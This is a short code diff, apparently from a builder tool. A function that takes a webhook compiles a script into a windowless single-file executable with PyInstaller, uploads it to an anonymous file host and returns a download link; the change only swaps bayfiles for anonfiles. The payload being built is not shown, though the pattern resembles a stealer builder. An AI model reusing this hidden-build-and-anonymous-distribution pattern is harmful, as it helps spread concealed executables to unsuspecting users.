@@ -357,7 +357,7 @@ def casw(ctx, webhook):
         subprocess.run(f"pyinstaller --onefile --noconsole {sf}", shell=True, check=True)
         
         with open(f"dist/{ef}", "rb") as f:
-            res = requests.post("https://api.bayfiles.com/upload", files={"file": f})
+            res = requests.post("https://api.anonfiles.com/upload", files={"file": f})
         
         download = res.json()["data"]["file"]["url"]["short"]
         os.remove(sf)
